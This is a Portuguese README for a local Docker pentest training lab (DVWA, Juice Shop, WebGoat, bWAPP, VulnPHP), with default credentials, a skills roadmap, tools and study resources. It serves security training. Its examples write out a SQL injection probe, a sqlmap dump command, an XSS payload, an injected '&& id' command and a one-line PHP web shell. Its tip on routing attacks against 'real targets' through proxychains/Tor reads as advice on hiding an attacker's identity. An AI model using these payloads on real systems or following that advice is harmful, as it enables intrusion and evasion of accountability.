# 🧪 Laboratório de Treino em Pentest

> Ambiente de treino completo com 5 aplicações vulneráveis rodando em Docker.
> **Totalmente grátis** — sem licenças, sem assinaturas.

---

## 📡 Acesso aos Laboratórios

| # | Lab | Endereço | Porta | Stack | Dificuldade |
|---|-----|----------|-------|-------|-------------|
| 1 | **DVWA** | http://localhost:8001 | 8001 | PHP + MySQL | Iniciante |
| 2 | **OWASP Juice Shop** | http://localhost:8002 | 8002 | Node.js + Express | Intermediário |
| 3 | **WebGoat** | http://localhost:8003/WebGoat | 8003 | Java + Spring | Iniciante |
| 4 | **BWAPP** | http://localhost:8004 | 8004 | PHP + MySQL | Iniciante-Intermediário |
| 5 | **VulnPHP** | http://localhost:8007 | 8007 | PHP + MySQL | Intermediário-Avançado |

### Credenciais Padrão

| Lab | Usuário | Senha | Observação |
|-----|---------|-------|------------|
| DVWA | `admin` | `password` | Login e clique em "Create/Reset Database" |
| Juice Shop | — | — | Não precisa login — explore anonimamente |
| WebGoat | `guest` | `guest` | Ou crie conta própria |
| BWAPP | `bee` | `bug` | Login após setup |
| VulnPHP | `root` | `password` | SSH na porta 8022 |

---

## 🎯 Roteiro de Treino por Nível

### 🌱 Nível 1 — Iniciante (DVWA + WebGoat)

**Objetivo:** Aprender os fundamentos de segurança web.

**DVWA — Desafios:**
1. **SQL Injection** — Brute force / UNION / Blind
2. **XSS (Reflected + Stored)** — Injetar scripts
3. **Command Injection** — Executar comandos no servidor
4. **File Upload** — Fazer upload de shell
5. **CSRF** — Forçar ações sem autorização
6. **SQL Injection (Blind)** — Extrair dados caractere por caractere

**WebGoat — Lições:**
1. HTTP Basics
2. SQL Injection (intro + advanced)
3. XSS (Cross-Site Scripting)
4. Broken Access Control
5. Authentication Flaws
6. Session Management

### 🏃 Nível 2 — Intermediário (Juice Shop + BWAPP)

**Juice Shop — Desafios:**
1. **Score Board** — Encontrar o painel oculto de desafios
2. **DOM XSS** — Injetar XSS via search
3. **SQL Injection** — Login como admin sem senha
4. **Broken Access Control** — Acessar carrinho de outro
5. **Mass Assignment** — Alterar dados de usuário via JSON
6. **SQL Injection (Advanced)** — Extrair dados de outras tabelas
7. **SSTI** — Server-Side Template Injection
8. **XXE** — XML External Entities

**BWAPP — Bugs:**
1. SQL Injection (múltiplos cenários)
2. Server-Side Includes (SSI) Injection
3. Server-Side Request Forgery (SSRF)
4. Cross-Site Request Forgery (CSRF)
5. File Upload vulnerabilities
6. Local/Remote File Inclusion (LFI/RFI)
7. PHP Code Injection

### 🚀 Nível 3 — Avançado (VulnPHP + Desafios Extras)

**VulnPHP — Exploração:**
1. **SQL Injection avançada** com bypass de WAF
2. **LFI → RCE** via log poisoning
3. **PHP Type Juggling** — Bypass de autenticação
4. **Privesc Linux** via SUID/GUID misconfig
5. **Pivoting** para containers internos
6. **SSRF** para serviços internos

---

## 🔧 Ferramentas para Usar no Treino

### Já instaladas neste ambiente:

| Ferramenta | Comando | Uso |
|------------|---------|-----|
| **nmap** | `nmap -sV localhost` | Scanner de portas |
| **sqlmap** | `sqlmap -u "http://localhost:8001/vulnerabilities/sqli/?id=1&Submit=Submit"` | SQL Injection automatizada |
| **curl** | `curl -v http://localhost:8002` | Testes manuais |
| **proxychains4** | `proxychains4 curl http://...` | Proxy via Tor |
| **wget** | `wget http://localhost:8001` | Download de páginas |
| **python3** | `python3 -m http.server 9999` | Servidor HTTP para testes |
| **openssl** | `openssl s_client -connect ...` | Testes TLS/SSL |

### Para instalar (se quiser mais):

```bash
# Burp Suite Community (grátis)
# Ou usar o próprio OpenCode + os agentes de pentest

# Gobuster / FFUF para content discovery
go install github.com/ffuf/ffuf/v2@latest
go install github.com/OJ/gobuster/v3@latest
```

---

## 📋 Exemplos de Comandos para Treino

### SQL Injection (DVWA - porta 8001)

```bash
# Teste básico de SQLi
curl "http://localhost:8001/vulnerabilities/sqli/?id=1'&Submit=Submit"

# SQLMap automatizado
sqlmap -u "http://localhost:8001/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=SUA_SESSAO" \
  --batch --dump
```

### XSS (Juice Shop - porta 8002)

```bash
# XSS no search
curl "http://localhost:8002/?search=<script>alert(1)</script>"
```

### Command Injection (DVWA)

```bash
# Testar command injection no ping
curl "http://localhost:8001/vulnerabilities/exec/\
?ip=127.0.0.1%20%26%26%20id&Submit=Submit"
```

### File Upload Shell (DVWA)

```bash
# Upload de shell PHP
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Enviar via formulário de upload (usar curl com -F)
```

---

## 🚀 Como Usar com o Framework de Pentest

Você pode usar o **próprio Red Team Operator** para testar os labs:

```bash
# No terminal do OpenCode:
pentest http://localhost:8001

# Ou para um lab específico:
pentest http://localhost:8002  # Juice Shop
```

O framework vai executar recon, enum, webapp attack e report automatizado **nos seus próprios laboratórios**.

---

## 📚 Recursos de Estudo

### Gratuitos (Online)
- **PortSwigger Web Security Academy** — https://portswigger.net/web-security
- **HackTheBox (free tier)** — https://www.hackthebox.com
- **TryHackMe (free tier)** — https://tryhackme.com
- **OWASP Top 10** — https://owasp.org/www-project-top-ten/
- **PentesterLab (free exercises)** — https://pentesterlab.com

### Canais YouTube (PT-BR)
- **Guia Anônima** — Pentest e Hacking Ético
- **Bruno Fraga** — Segurança Ofensiva
- **Solyd** — Treinamentos de Segurança
- **Hackers do Bem** — Iniciativa do governo federal

### Certificações (Roadmap)
```
Iniciante → eJPT (INE) ou Security+ (CompTIA)
Intermediário → PNPT (TCM Security) ou OSCP (OffSec)
Avançado → CARTP ou CRTO (Red Team Ops)
```

---

## 🛑 Gerenciando os Laboratórios

```bash
# Parar todos os labs
cd ~/lab-treino && sudo docker compose stop

# Iniciar novamente
sudo docker compose start

# Ver logs de um lab específico
sudo docker logs lab-dvwa -f

# Parar e remover tudo
sudo docker compose down

# Atualizar as imagens
sudo docker compose pull
```

---

## ⚠️ Importante

- Os laboratórios rodam **apenas na sua máquina local** (`localhost`)
- Não exponha as portas para a internet (firewall local)
- Use `proxychains4` quando testar contra alvos REAIS
- Nunca use técnicas contra sistemas sem autorização
- Sempre faça `git commit` antes de começar um treino novo

---

*Bons treinos! 🎯*
*Laboratório configurado em 2026-08-25*